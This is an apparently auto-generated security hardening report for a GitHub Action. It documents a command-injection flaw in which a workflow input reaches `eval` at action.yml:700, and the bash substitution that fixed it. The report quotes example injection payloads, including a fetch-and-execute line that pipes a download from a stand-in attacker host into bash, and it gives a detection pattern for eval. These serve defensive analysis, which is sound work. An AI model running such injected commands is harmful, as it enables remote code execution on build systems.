# Hardening Report: FirelyTeam--firely-terminal-pipeline/v0.8.6

> This file was generated automatically by the hardening agent.

**Policy SHA:** `ff50f15e4b79bfbf764dafdfd2579175a6ea9771`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `1`

Action **FirelyTeam--firely-terminal-pipeline/v0.8.6** was hardened automatically. 2 finding(s) were identified and resolved across 1 iteration(s).

## Findings Fixed

### suspicious-run-content (severity: high)

The 'Download Java Validator' step uses `eval echo "$JAVA_VALIDATOR_DOWNLOAD_LOCATION"` where `JAVA_VALIDATOR_DOWNLOAD_LOCATION` is populated from `inputs.JAVA_VALIDATOR_DOWNLOAD_LOCATION`. This matches the eval-dynamic sub-check pattern (`eval\s+[$]`). An attacker who controls this input can supply a value like `$(malicious_command)` which will be executed by the shell when `eval` processes it. The pattern is: `JAVA_VALIDATOR_DOWNLOAD_LOCATION=$(eval echo "$JAVA_VALIDATOR_DOWNLOAD_LOCATION")`.

Locations:

- `action.yml:700`

### script-injection (severity: high)

The 'Download Java Validator' step passes an attacker-controlled input through `eval`, enabling arbitrary command injection. The value flows from `inputs.JAVA_VALIDATOR_DOWNLOAD_LOCATION` → env var `JAVA_VALIDATOR_DOWNLOAD_LOCATION` → `eval echo "$JAVA_VALIDATOR_DOWNLOAD_LOCATION"`. Routing through an env var does not sanitize the value when it is subsequently passed to `eval`. An attacker can inject shell commands (e.g. `$(curl attacker.com | bash)`) via this input.

Locations:

- `action.yml:700`

## Iteration Notes

### Iteration 1

**Fixes applied:** suspicious-run-content, script-injection

**Notes:**

Replaced `JAVA_VALIDATOR_DOWNLOAD_LOCATION=$(eval echo "$JAVA_VALIDATOR_DOWNLOAD_LOCATION")` with safe bash string substitution: `JAVA_VALIDATOR_DOWNLOAD_LOCATION="${JAVA_VALIDATOR_DOWNLOAD_LOCATION//\$JAVA_VALIDATOR_VERSION/$JAVA_VALIDATOR_VERSION}"` and `JAVA_VALIDATOR_DOWNLOAD_LOCATION="${JAVA_VALIDATOR_DOWNLOAD_LOCATION//\${JAVA_VALIDATOR_VERSION\}/$JAVA_VALIDATOR_VERSION}"`. This preserves the intended functionality of expanding the version variable in the default download URL (https://github.com/hapifhir/org.hl7.fhir.core/releases/download/$JAVA_VALIDATOR_VERSION/validator_cli.jar) while eliminating the arbitrary command injection vulnerability that `eval` enabled. The other `eval` occurrences in the file are `yq eval` (the yq YAML query tool subcommand) and are not security issues.

